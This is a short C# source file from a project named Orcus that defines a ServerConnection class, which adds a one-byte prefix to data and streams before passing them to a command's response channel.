using Orcus.Plugins;
using Orcus.Shared.Data;

namespace Orcus.Commands.ConnectionInitializer
{
    public class ServerConnection : IConnection
    {
        private readonly Command _command;
        private readonly IConnectionInfo _connectionInfo;
        private readonly byte _prefix;

        public ServerConnection(IConnectionInfo connectionInfo, Command command, byte prefix)
        {
            _connectionInfo = connectionInfo;
            _command = command;
            _prefix = prefix;
        }

        public void Dispose()
        {
        }

        public void SendData(byte[] buffer, int offset, int length)
        {
            _connectionInfo.UnsafeResponse(_command, length + 1, writer =>
            {
                writer.Write(_prefix);
                writer.Write(buffer, offset, length);
            });
        }

        public bool SupportsStream { get; } = true;

        public void SendStream(WriterCall writerCall)
        {
            _connectionInfo.UnsafeResponse(_command, new WriterCall(writerCall.Size + 1, stream =>
            {
                stream.WriteByte(_prefix);
                writerCall.WriteIntoStream(stream);
            }));
        }
    }
}